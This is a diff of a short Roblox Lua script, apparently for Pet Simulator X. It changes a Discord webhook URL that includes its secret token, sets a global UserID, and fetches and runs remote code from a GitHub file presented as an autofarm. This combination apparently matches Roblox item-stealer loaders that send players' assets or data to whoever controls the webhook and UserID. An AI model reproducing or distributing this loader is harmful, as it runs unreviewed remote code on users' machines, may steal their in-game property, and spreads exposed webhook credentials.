@@ -1,5 +1,5 @@
 _G.UserID = 2602423367
-_G.WebHook = "https://discord.com/api/webhooks/1058206401228460082/6fTNeIaj-JhoQn29gjkEDQenxymb32rnRcRtirBkPW9X847w5L2eWnXWAVDMcWYIOhOk"
+_G.WebHook = "https://discord.com/api/webhooks/1058206961797185586/Q3BeoyXRf3rukVv4C6o9umHDG6dF0394iiFODzzjsZ0H-nPt2np9Kc9PfU_V2lmEOA5t"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/SilenceScripts/PsxScripts.Lua/main/PsxAutofarm.true"))()
 
